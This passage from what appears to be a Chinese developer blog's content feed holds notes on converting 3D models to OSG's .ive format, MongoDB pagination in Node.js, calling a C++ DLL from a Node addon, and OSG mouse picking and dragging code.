<h2 id="ive"><a href="#ive" class="headerlink" title=".ive"></a>.ive</h2><p>ive是由OpenSceneGraph（OSG）创建的三维模型文件，OSG是用于建模和动画处理的开源3D图形工具包； 包含使用该软件创建的3D场景； 用于可视化，仿真，游戏，虚拟现实和其他建模方案。IVE文件以二进制格式存储，有助于查看和渲染场景时提高性能。</p>
<h1 id="OSG实用工具"><a href="#OSG实用工具" class="headerlink" title="OSG实用工具"></a>OSG实用工具</h1><h2 id="osgconv"><a href="#osgconv" class="headerlink" title="osgconv"></a>osgconv</h2><p>osgconv是一种非常有用的的工具来读取标准的3D格式，如OpenFlight,3DS,Alias Wavefront(OBJ) etc，并且可以将它们转换为一种OSG所支持的格式，如OSG中的ASCII格式的.osg，二进制格式的.ive。</p>
<p>在程序运行的默认情况下，优化导入的场景图，将形成的这样结果：场景图读取的数据量将会更少且速度会更快。尤其值得指出的是，.ive格式的的文件，快速装载数据的能力使它非常适合数据页和大型的数据库。</p>
<p>osgconv常用方式为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 将cow.obj转成ive</span><br><span class="line">osgconv cow.obj cow.ive</span><br><span class="line"># 沿Z轴逆时针旋转90度</span><br><span class="line">osgconv -o -90-0,0,1 cow.obj cow.ive</span><br></pre></td></tr></table></figure>

<h2 id="osgviewer"><a href="#osgviewer" class="headerlink" title="osgviewer"></a>osgviewer</h2><p>osgviewer 是随 OpenSceneGraph 一起分发的基本场景图查看器。它的主要目的是一个如何编写简单查看器的示例，但它的功能也足以用作基本的 3D 图形查看器。使用方法如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osgviewer cow.ive</span><br></pre></td></tr></table></figure>

<h2 id="osg插件"><a href="#osg插件" class="headerlink" title="osg插件"></a>osg插件</h2><p>OpenSceneGraph 核心发行版中有 45 个插件，它们提供了对原生和 3rd 方文件格式的读写支持。OpenSceneGraph 数据库插件库 osgDB 自动按需加载插件，使用正在加载/保存的文件的扩展名来确定要加载哪个插件。osgDB 加载必要的插件是透明的，实际上你不应该做任何特殊的事情来加载某种文件类型。唯一需要记住的因素是 OSG 需要支持文件格式（由文件的扩展名决定）并且您应该已经编译了必要的插件。</p>
<h1 id="转换方法"><a href="#转换方法" class="headerlink" title="转换方法"></a>转换方法</h1><p>将glb文件转换成ive文件的流程如下：</p>
<ol>
<li>使用blender 2.92 导入 glb 文件。</li>
<li>使用blender 2.92 将 glb 文件导出成 dae 文件。注意导出时选择导出纹理图像。该步骤的主要目的是为了获取glb文件的纹理图像。</li>
<li>使用blender 2.92 将 glb 文件导出成 obj 文件。 注意导出时选择导出纹理图像。该步骤将生成.obj、.mtl、.jpg三种文件，其中.jpg是纹理图像。如果纹理图像导出失败，可使用 dae 文件的纹理图像，同时注意修改.mtl文件中纹理图像的路径。.obj、.mtl均是文本文件，可直接打开。</li>
<li>使用命令 osgconv -o -90-0,0,1 cow.obj cow.ive 将obj文件转换成ive文件。-o选择将模型朝向沿着坐标轴进行旋转。</li>
</ol>
<h1 id="转换需要注意的问题"><a href="#转换需要注意的问题" class="headerlink" title="转换需要注意的问题"></a>转换需要注意的问题</h1><p>3D文件格式转换需要注意的问题主要有：</p>
<ul>
<li>blender打开glb文件渲染时出现透明区域，显示背面区域的问题。</li>
</ul>
<p>因为对blender建模软件不够熟悉，刚开始以为是纹理贴图的问题，后面才发现是面朝向的问题。法线朝外的面是正面，朝里的面是背面。透明区域的面法线朝里，我们看到的是背面。由于blender着色器默认使用背面剔除功能，导致本应不透明的面被删除，导致出现透明区域现象。</p>
<p>检测方面很简单，在blender中选择“视图叠加层”-&gt;“面朝向”打勾，模型正面将显示蓝色，背面显示红色。显示红色的区域就是透明区域。</p>
<p>解决方法很简单，在blender中选择红色区域三角面，选择“网格”-&gt;“法线”-&gt;“翻转”, 将背面变为正面，即可解决模型显示透明区域问题。</p>
<ul>
<li><p>blender将glb转换成obj丢失纹理问题。解决方法在转换流程中已有介绍，在此不再详述。</p>
</li>
<li><p>模型朝向问题。解决方法在转换流程中已有介绍，在此不再详述。</p>
</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.bgteach.com/article/132" target="_blank" rel="noopener">三维文件格式知多少 | abc、glTF、fbx、obj、dae、stl、3ds..</a>,by 饼干教育.</li>
<li><a href="https://new.qq.com/omn/20200828/20200828A04JEE00.html" target="_blank" rel="noopener">超实用：一篇文章带你了解市面上主流通用的3D模型格式</a>,by qq.</li>
<li><a href="https://en.wikipedia.org/wiki/COLLADA" target="_blank" rel="noopener">COLLADA</a>,by wikipedia.</li>
<li><a href="https://en.wikipedia.org/wiki/GlTF" target="_blank" rel="noopener">glTF</a>,by wikipedia.</li>
<li><a href="https://www.cnblogs.com/mazhenyu/p/5995519.html" target="_blank" rel="noopener">osgconv使用指南(转)</a>,by 3D入魔.</li>
<li><a href="http://osgchina.org/show.php?id=50" target="_blank" rel="noopener">osgconv</a>,by osgchina.</li>
<li><a href="https://www.bilibili.com/video/BV1Hp4y1v7Cx/" target="_blank" rel="noopener">背面剔除，正面剔除是什么能干嘛，从Blender和Unity解读，来2个效果你就懂了</a>,by 拉克哈尼.</li>
<li><a href="http://www.openscenegraph.org/index.php/documentation/guides/user-guides/61-osgplugins" target="_blank" rel="noopener">osgPlugins</a>,by openscenegraph.</li>
<li><a href="https://zhuanlan.zhihu.com/p/347726082" target="_blank" rel="noopener">科普：FBX格式和OBJ格式异同</a>,by Tech fan.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB学习笔记</title>
    <url>/2021/05/11/MongoDB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>MongoDB是一种NoSQL类型数据库，与关系型数据库相比，它具有很强的灵活性，无需类似Sequelize这样的ORM库，即可直接访问。例如，使用nodejs访问MongoDB：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const &#123; MongoClient &#125; &#x3D; require(&quot;mongodb&quot;);</span><br><span class="line">const db&#x3D; await MongoClient.connect(appConfig.mongoUri);</span><br><span class="line">var dbo &#x3D; db.db(appConfig.mongodbName);</span><br><span class="line">var actions &#x3D; await dbo.collection(&quot;actions&quot;).find(&#123;&quot;equipmentId&quot;:req.query.equipmentId&#125;, &#123;</span><br><span class="line">    &quot;limit&quot;:parseInt(req.query.limit) || 25,</span><br><span class="line">    &quot;skip&quot;:parseInt(req.query.offset)|| 0</span><br><span class="line">&#125;).toArray();</span><br><span class="line">db.close()</span><br></pre></td></tr></table></figure>

<p>尽管MongoDB很灵活，但在设计其数据模型时，为了确保数据组织的一致性，应遵循一下原则:</p>
<ul>
<li>一个文档就是一个实体对象，应精心设计</li>
<li>文档中包含的任何对象，都对应实体</li>
</ul>
<h1 id="分页查询及排序"><a href="#分页查询及排序" class="headerlink" title="分页查询及排序"></a>分页查询及排序</h1><p>请参考以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var departments &#x3D; await dbConnect.collection(&quot;departments&quot;).find(&#123;&#125;, &#123;</span><br><span class="line">            &quot;limit&quot;:parseInt(req.query.limit) || 25,</span><br><span class="line">            &quot;skip&quot;:parseInt(req.query.offset)|| 0</span><br><span class="line">        &#125;).sort(&#123;_id:-1&#125;).toArray();</span><br></pre></td></tr></table></figure>
<h1 id="更新数组中某个对象的字段值"><a href="#更新数组中某个对象的字段值" class="headerlink" title="更新数组中某个对象的字段值"></a>更新数组中某个对象的字段值</h1><p>请参考<a href="https://zackku.com/mongo-update-array/" target="_blank" rel="noopener">MongoDB更新数组中某个对象的元素</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://docs.mongodb.com/manual/" target="_blank" rel="noopener">The MongoDB 4.4 Manual</a>,by mongodb.</li>
<li><a href="https://sequelize.org/" target="_blank" rel="noopener">Sequelize ORM</a>,by sequelize.</li>
<li><a href="https://www.cnblogs.com/capqueen/p/MongoDBPagination.html" target="_blank" rel="noopener">MongoDB 分页查询的方法及性能</a>,by 笋干.</li>
<li><a href="https://testerhome.com/articles/23818" target="_blank" rel="noopener">移动测试开发 Mongodb 的分页优化及索引使用</a>,by <a href="mailto:opentest-oper@360.cn">opentest-oper@360.cn</a>.</li>
<li><a href="https://zackku.com/mongo-update-array/" target="_blank" rel="noopener">MongoDB更新数组中某个对象的元素</a>,by zackku.</li>
<li><a href="https://blog.csdn.net/yaomingyang/article/details/78696759" target="_blank" rel="noopener">Mongodb数组操作$(update)、$占位符更新嵌套数组、嵌套文档集合</a>,by OceanSky6.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>Node_C++_Addon插件编写方法</title>
    <url>/2018/06/20/Node-Addon%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>最近研究在Nodejs中调用DLL，上网搜索发现主要有两种方法：</p>
<ul>
<li>使用Nodeffi调用C风格接口的DLL，但是无法调用C++风格导出类的DLL。</li>
<li>使用Nodejs C++ Addon 插件，该方法可直接与C++代码交互，理论上可以调用C++风格导出类的DLL。</li>
</ul>
<p>下面研究Nodejs Addon C++插件的编写方法。</p>
<h1 id="什么是Nodejs-C-Addon"><a href="#什么是Nodejs-C-Addon" class="headerlink" title="什么是Nodejs C++ Addon"></a>什么是Nodejs C++ Addon</h1><p>Node.js插件（Addons）是C/C++编写的动态链接对象，这些对象可以被Node.js的require()函数引用，并可以像普通的Node.js模块一样使用。Addons主要用于提供一个Node.js中运行的JavaScript和C/C++库之间的接口。</p>
<p>插件（Addons）是动态链接的共享对象，它提供了C/C++类库的调用能力。实现插件的方法比较复杂，涉及到以下元组件及API:</p>
<ul>
<li>V8：C++库，Node.js用于提供JavaScript执行环境。V8提供了对象创建、函数调用等执行机制，V8相关API包含在了v8.h头文件中（位于Node.js源码树的deps/v8/include/v8.h），也可以查看在线文档。</li>
<li>libuv：C库，实现了Node.js中的事件循环、工作线程及在不同平台中异步行为的相关功能。也可以做为是一个跨平台的抽象库，提供了简单的、类POSIX的对主要操作系统的常见系统任务功能，如：与文件系统、套接字、计时器、系统事件的交互等。libuv还提供了一个类pthreads的线程池抽象对象，可用于更复杂的、超越标准事件循环的异步插件的控制功能。</li>
<li>内部Node.js库：Node.js自身提供了一定义数量的C/C++API的插件可以使用 - 其中最重要的可能是node::ObjectWrap类</li>
<li>Node.js静态链接库：Node.js自身还包含了一部分静态链接库，如OpenSSL。这些位于Node.js源码树的deps/目录下，只有V8和OpenSSL提供了符号出口，可以供Node.js和基它插件所使用。详见Node.js依赖链接</li>
</ul>
<h1 id="Node-Addon插件编写方法"><a href="#Node-Addon插件编写方法" class="headerlink" title="Node Addon插件编写方法"></a>Node Addon插件编写方法</h1><p>Node Addon插件的编写需要解决两个关键问题：</p>
<ul>
<li>当数据流向 javaScript -&gt; C++时，如何将javascript类型数据包装成C++类型数据，供C++代码使用。</li>
<li>当数据流向 C++ -&gt; JavaScript时，如何将C++类型数据包装成JavaScript类型数据，供JavaScript代码使用。</li>
</ul>
<p>这两个关键问题的分析请参见淘宝前端团队成员发表的文章“Node.js 和 C++ 之间的类型转换<sup>[3]</sup>”。解决这两个关键问题后，Node Addon插件编写难度就不大了。</p>
<h1 id="Node-Addon插件调用C-导出类DLL方法测试"><a href="#Node-Addon插件调用C-导出类DLL方法测试" class="headerlink" title="Node Addon插件调用C++导出类DLL方法测试"></a>Node Addon插件调用C++导出类DLL方法测试</h1><p>现有一个采用成熟方法导出类接口的DLL<sup>[4]</sup>，如何在Node Addon插件中调用该DLL呢?下面nodejs官网Node Addon插件例子Factory of wrapped objects为例进行讲解。</p>
<p>Factory of wrapped objects例子在Addon插件中包装了一个MyObject类，现在就在MyObject类调用DLL导出类的接口方法。修改MyObject.h代码，增加DLL导出类接口方法，增加类接口成员变量IExport和DLL句柄变量hDll，如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; myobject.h</span><br><span class="line">#ifndef MYOBJECT_H</span><br><span class="line">#define MYOBJECT_H</span><br><span class="line"></span><br><span class="line">#include &lt;node.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;node_object_wrap.h&gt;</span><br><span class="line">#include &quot;MatureApproach.h&quot;</span><br><span class="line"></span><br><span class="line">namespace demo &#123;</span><br><span class="line">typedef IExport*(*TYPE_fnCreateExportObj) (void);&#x2F;&#x2F;定义函数指针  </span><br><span class="line">typedef void(*TYPE_fnDestroyExportObj) (IExport*);&#x2F;&#x2F;定义函数指针  </span><br><span class="line"></span><br><span class="line">class MyObject : public node::ObjectWrap &#123;</span><br><span class="line"> public:</span><br><span class="line">  static void Init(v8::Isolate* isolate);</span><br><span class="line">  static void NewInstance(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span><br><span class="line"></span><br><span class="line"> private:</span><br><span class="line">  explicit MyObject(double value &#x3D; 0);</span><br><span class="line">  ~MyObject();</span><br><span class="line"></span><br><span class="line">  static void New(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span><br><span class="line">  static void PlusOne(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span><br><span class="line">  static void Hi(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span><br><span class="line">  static void Test(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span><br><span class="line">  static v8::Persistent&lt;v8::Function&gt; constructor;</span><br><span class="line">  HMODULE hDll;</span><br><span class="line">  IExport* pExport;</span><br><span class="line">  double value_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  &#x2F;&#x2F; namespace demo</span><br><span class="line"></span><br><span class="line">#endif</span><br></pre></td></tr></table></figure>
<p>接下来将在MyObject类的构造函数中动态加载DLL，创建DLL导出类对象，在析构函数中析构DLL导出类对象，动态卸载DLL,在MyObject成员方法中调用DLL导出类方法，代码如下所示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; myobject.cc</span><br><span class="line">#include &lt;node.h&gt;</span><br><span class="line">#include &quot;myobject.h&quot;</span><br><span class="line"></span><br><span class="line">namespace demo &#123;</span><br><span class="line"></span><br><span class="line">using v8::Context;</span><br><span class="line">using v8::Function;</span><br><span class="line">using v8::FunctionCallbackInfo;</span><br><span class="line">using v8::FunctionTemplate;</span><br><span class="line">using v8::Isolate;</span><br><span class="line">using v8::Local;</span><br><span class="line">using v8::Number;</span><br><span class="line">using v8::Object;</span><br><span class="line">using v8::Persistent;</span><br><span class="line">using v8::String;</span><br><span class="line">using v8::Value;</span><br><span class="line"></span><br><span class="line">Persistent&lt;Function&gt; MyObject::constructor;</span><br><span class="line"></span><br><span class="line">MyObject::MyObject(double value) : value_(value)&#123;</span><br><span class="line">	MyObject::hDll &#x3D; LoadLibrary(&quot;MatureApproach.dll&quot;); &#x2F;&#x2F;加载动态链接库DllDemo.dll文件；</span><br><span class="line">  TYPE_fnCreateExportObj fnCreateExportObj &#x3D; (TYPE_fnCreateExportObj)GetProcAddress(MyObject::hDll, &quot;CreateExportObj&quot;);</span><br><span class="line">  MyObject::pExport &#x3D; fnCreateExportObj();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MyObject::~MyObject() &#123;</span><br><span class="line">  TYPE_fnDestroyExportObj fnDestroyExportObj &#x3D; (TYPE_fnDestroyExportObj)GetProcAddress(MyObject::hDll, &quot;DestroyExportObj&quot;);</span><br><span class="line">  fnDestroyExportObj(MyObject::pExport);</span><br><span class="line">  FreeLibrary(MyObject::hDll);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::Init(Isolate* isolate) &#123;</span><br><span class="line">  &#x2F;&#x2F; Prepare constructor template</span><br><span class="line">  Local&lt;FunctionTemplate&gt; tpl &#x3D; FunctionTemplate::New(isolate, New);</span><br><span class="line">  tpl-&gt;SetClassName(String::NewFromUtf8(isolate, &quot;MyObject&quot;));</span><br><span class="line">  tpl-&gt;InstanceTemplate()-&gt;SetInternalFieldCount(3);</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; Prototype</span><br><span class="line">  NODE_SET_PROTOTYPE_METHOD(tpl, &quot;plusOne&quot;, PlusOne);</span><br><span class="line">  NODE_SET_PROTOTYPE_METHOD(tpl, &quot;hi&quot;, Hi);</span><br><span class="line">  NODE_SET_PROTOTYPE_METHOD(tpl, &quot;test&quot;, Test);</span><br><span class="line"></span><br><span class="line">  constructor.Reset(isolate, tpl-&gt;GetFunction());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::New(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  Isolate* isolate &#x3D; args.GetIsolate();</span><br><span class="line"></span><br><span class="line">  if (args.IsConstructCall()) &#123;</span><br><span class="line">    &#x2F;&#x2F; Invoked as constructor: &#96;new MyObject(...)&#96;</span><br><span class="line">    double value &#x3D; args[0]-&gt;IsUndefined() ? 0 : args[0]-&gt;NumberValue();</span><br><span class="line">    MyObject* obj &#x3D; new MyObject(value);</span><br><span class="line">    obj-&gt;Wrap(args.This());</span><br><span class="line">    args.GetReturnValue().Set(args.This());</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; Invoked as plain function &#96;MyObject(...)&#96;, turn into construct call.</span><br><span class="line">    const int argc &#x3D; 1;</span><br><span class="line">    Local&lt;Value&gt; argv[argc] &#x3D; &#123; args[0] &#125;;</span><br><span class="line">    Local&lt;Function&gt; cons &#x3D; Local&lt;Function&gt;::New(isolate, constructor);</span><br><span class="line">    Local&lt;Context&gt; context &#x3D; isolate-&gt;GetCurrentContext();</span><br><span class="line">    Local&lt;Object&gt; instance &#x3D;</span><br><span class="line">        cons-&gt;NewInstance(context, argc, argv).ToLocalChecked();</span><br><span class="line">    args.GetReturnValue().Set(instance);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::NewInstance(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  Isolate* isolate &#x3D; args.GetIsolate();</span><br><span class="line"></span><br><span class="line">  const unsigned argc &#x3D; 1;</span><br><span class="line">  Local&lt;Value&gt; argv[argc] &#x3D; &#123; args[0] &#125;;</span><br><span class="line">  Local&lt;Function&gt; cons &#x3D; Local&lt;Function&gt;::New(isolate, constructor);</span><br><span class="line">  Local&lt;Context&gt; context &#x3D; isolate-&gt;GetCurrentContext();</span><br><span class="line">  Local&lt;Object&gt; instance &#x3D;</span><br><span class="line">      cons-&gt;NewInstance(context, argc, argv).ToLocalChecked();</span><br><span class="line"></span><br><span class="line">  args.GetReturnValue().Set(instance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::PlusOne(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  Isolate* isolate &#x3D; args.GetIsolate();</span><br><span class="line"></span><br><span class="line">  MyObject* obj &#x3D; ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder());</span><br><span class="line">  obj-&gt;value_ +&#x3D; 1;</span><br><span class="line"></span><br><span class="line">  args.GetReturnValue().Set(Number::New(isolate, obj-&gt;value_));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::Hi(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  Isolate* isolate &#x3D; args.GetIsolate();</span><br><span class="line"></span><br><span class="line">  MyObject* obj &#x3D; ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder());</span><br><span class="line">  Local&lt;String&gt; str&#x3D;v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Hi().data());</span><br><span class="line"></span><br><span class="line">  args.GetReturnValue().Set(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void MyObject::Test(const FunctionCallbackInfo&lt;Value&gt;&amp; args) &#123;</span><br><span class="line">  Isolate* isolate &#x3D; args.GetIsolate();</span><br><span class="line"></span><br><span class="line">  MyObject* obj &#x3D; ObjectWrap::Unwrap&lt;MyObject&gt;(args.Holder());</span><br><span class="line">  Local&lt;String&gt; str&#x3D;v8::String::NewFromUtf8(isolate, obj-&gt;pExport-&gt;Test().data());</span><br><span class="line"></span><br><span class="line">  args.GetReturnValue().Set(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;  &#x2F;&#x2F; namespace demo</span><br></pre></td></tr></table></figure>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://itbilu.com/nodejs/core/4y4-Nrd5G.html" target="_blank" rel="noopener">Node.js C/C++插件（Addons）</a>, by IT笔录</li>
<li><a href="https://nodejs.org/dist/latest-v8.x/docs/api/addons.html" target="_blank" rel="noopener">Node.js v8.16.1 Documentation</a>，by nodejs</li>
<li><a href="http://taobaofed.org/blog/2016/09/20/type-casts-between-node-and-cpp/" target="_blank" rel="noopener">type-casts-between-node-and-cpp</a>，by 淘宝前端团队</li>
<li><a href="https://huangwang.github.io/2018/06/15/DLL导出类和函数/">DLL导出类和函数</a>,by jackhuang</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG的observer_ptr指针</title>
    <url>/2021/12/25/OSG%E7%9A%84observer-ptr%E6%8C%87%E9%92%88/</url>
    <content><![CDATA[<blockquote>
<p>observer_ptr指针，这个指针和它的名字一样，就是用来观察指针的，可以把它想象成一个观察者，它只观察一个你给他指点的对象，但是不会影响这个对象的创建和销毁，它只是一个旁观者，但是它观察的这个对象要是被销毁了它也会知道并且自己也会被销毁。和osg::ref_ptr不同，osg::ref_ptr是用来管理指针的创建和删除的。</p>
</blockquote>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/u012501459/article/details/37923151" target="_blank" rel="noopener">OSG中的observer_ptr指针</a>,by vincent-xia.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>飞行仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>Office使用技巧笔记</title>
    <url>/2021/05/19/Office%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>记录各类Office使用技巧，以备使用。</p>
<h1 id="MathType批量修改公式字体和大小"><a href="#MathType批量修改公式字体和大小" class="headerlink" title="MathType批量修改公式字体和大小"></a>MathType批量修改公式字体和大小</h1><h1 id="Word中的公式自动编号"><a href="#Word中的公式自动编号" class="headerlink" title="Word中的公式自动编号"></a>Word中的公式自动编号</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/Pieces_thinking/article/details/53483938" target="_blank" rel="noopener"><Office>怎样使公式与编号上下对齐？</a>,by 碎碎思.</li>
<li><a href="https://blog.csdn.net/zaishuiyifangxym/article/details/81709319" target="_blank" rel="noopener">Word 2016 撰写论文(1): 公式居中、编号右对齐</a>,by TechArtisan6.</li>
<li><a href="https://zhuanlan.zhihu.com/p/338903728" target="_blank" rel="noopener">MathType中如何批量修改公式字体和大小</a>,by 有你.</li>
<li><a href="https://blog.51cto.com/sddai/3017106" target="_blank" rel="noopener">Microsoft Office Word 中的公式自动编号</a>,by stardsd .</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>OSG鼠标拾取拖拽物体的原理</title>
    <url>/2021/04/13/OSG%E9%BC%A0%E6%A0%87%E6%8B%BE%E5%8F%96%E6%8B%96%E6%8B%BD%E7%89%A9%E4%BD%93%E7%9A%84%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>在3D世界中，通过鼠标拾取拖拽物体是一个神奇事情，它的具体实现方法如下：</p>
<ol>
<li>将鼠标点击视口的二维坐标转换成3D世界中的三维坐标。</li>
<li>视点出发到鼠标点击位置的可形成一条射线，在场景节点树上遍历，查找与射线相交的节点。</li>
<li>获得拾取节点与视点之间距离，从而计算得到鼠标释放时拾取节点的位置，平移拾取节点到目标位置。</li>
</ol>
<h1 id="2D坐标转3D坐标参考"><a href="#2D坐标转3D坐标参考" class="headerlink" title="2D坐标转3D坐标参考"></a>2D坐标转3D坐标参考</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">osg::Vec3 screenToWorld(osgViewer::Viewer* viewer,double dx,double dy)</span><br><span class="line">&#123;</span><br><span class="line">    osg::Camera *camera &#x3D; viewer-&gt;getCamera();</span><br><span class="line">    osg::Matrix viewMat &#x3D; camera-&gt;getViewMatrix(); &#x2F;&#x2F;获取当前视图矩阵</span><br><span class="line">    osg::Matrix projMat &#x3D; camera-&gt;getProjectionMatrix();&#x2F;&#x2F;获取投影矩阵</span><br><span class="line">    osg::Matrix windMat &#x3D; camera-&gt;getViewport()-&gt;computeWindowMatrix();&#x2F;&#x2F;获取窗口矩阵</span><br><span class="line">    osg::Matrix MVPW &#x3D; viewMat * projMat *windMat;  &#x2F;&#x2F;视图-》投影-》窗口变换</span><br><span class="line"></span><br><span class="line">    osg::Matrix inverseMVPW &#x3D; osg::Matrix::inverse(MVPW);  </span><br><span class="line">    osg::Vec3 mouseWorld &#x3D; osg::Vec3(dx, dy, 0) * inverseMVPW;  </span><br><span class="line">    return mouseWorld;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="获取拾取节点代码参考"><a href="#获取拾取节点代码参考" class="headerlink" title="获取拾取节点代码参考"></a>获取拾取节点代码参考</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;参数说明：firstPos:是当前摄像机的位置。endPos:为偏移坐标值，eye + curRayLineDir*100</span><br><span class="line">&#x2F;&#x2F;curRayLineDir &#x3D; mouseWorldPos（屏幕点转三维点使用上面的函数） - eye;</span><br><span class="line">&#x2F;&#x2F;curRayLineDir.normallize();</span><br><span class="line">void CIntersectEventHandler::rayLinePick(const osg::Vec3&amp; firstPos,const osg::Vec3&amp; endPos)</span><br><span class="line">&#123;</span><br><span class="line">    osg::ref_ptr&lt;osgUtil::LineSegmentIntersector&gt; lineSegmentIntesector &#x3D; \</span><br><span class="line">        new osgUtil::LineSegmentIntersector(firstPos,endPos);</span><br><span class="line">    osgUtil::IntersectionVisitor intersectionVisitor(lineSegmentIntesector);</span><br><span class="line"></span><br><span class="line">    m_matNode-&gt;accept(intersectionVisitor);&#x2F;&#x2F;m_matNode为你拾取的物体</span><br><span class="line"></span><br><span class="line">    osgUtil::LineSegmentIntersector::Intersections intersections;</span><br><span class="line">    if (lineSegmentIntesector-&gt;containsIntersections())</span><br><span class="line">    &#123;</span><br><span class="line">        intersections &#x3D; lineSegmentIntesector-&gt;getIntersections();</span><br><span class="line">        for(auto iter &#x3D; intersections.begin(); iter !&#x3D; intersections.end(); ++iter)</span><br><span class="line">        &#123;</span><br><span class="line">            osg::NodePath nodePath &#x3D; iter-&gt;nodePath;</span><br><span class="line">            m_pickPoint &#x3D; iter-&gt;getWorldIntersectPoint();</span><br><span class="line">            for(int i&#x3D;0; i&lt;nodePath.size(); ++i)</span><br><span class="line">            &#123;</span><br><span class="line">                m_pickObj &#x3D; dynamic_cast&lt;osg::MatrixTransform*&gt;(nodePath[i]);&#x2F;&#x2F;拾取到的node</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="拖拽物体参考"><a href="#拖拽物体参考" class="headerlink" title="拖拽物体参考"></a>拖拽物体参考</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;我是在osgGA::GUIEventAdapter::DRAG进行拖拽的功能</span><br><span class="line">if(m_pickObj &amp;&amp; m_bLeftMouseBtn)&#x2F;&#x2F;这个布尔值就是晓得鼠标的左键是否按下了。</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;获取当前的摄像机的位置</span><br><span class="line">    osg::Vec3 eye &#x3D; viewer-&gt;getCamera()-&gt;getInverseViewMatrix().getTrans();</span><br><span class="line">    &#x2F;&#x2F;计算当前摄像机与pick到的模型之间的距离是多少</span><br><span class="line">    osg::Vec3 offset &#x3D; m_pickPoint - eye;</span><br><span class="line">    int dist &#x3D; offset.length();</span><br><span class="line">    &#x2F;&#x2F;计算当前的鼠标屏幕点映射到三维中的值</span><br><span class="line">    osg::Vec3 mouseWorldPos &#x3D; screenToWorld(viewer,ea.getX(),ea.getY());</span><br><span class="line">    &#x2F;&#x2F;计算当前鼠标三维点与摄像机的方向</span><br><span class="line">    osg::Vec3 rayDir &#x3D; mouseWorldPos - eye;</span><br><span class="line">    rayDir.normalize();</span><br><span class="line">    &#x2F;&#x2F;最后计算物体拖拽时最终的世界位置</span><br><span class="line">    osg::Vec3 curPos &#x3D; eye + rayDir*dist;</span><br><span class="line">    m_pickObj-&gt;setMatrix(osg::Matrix::translate(curPos));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
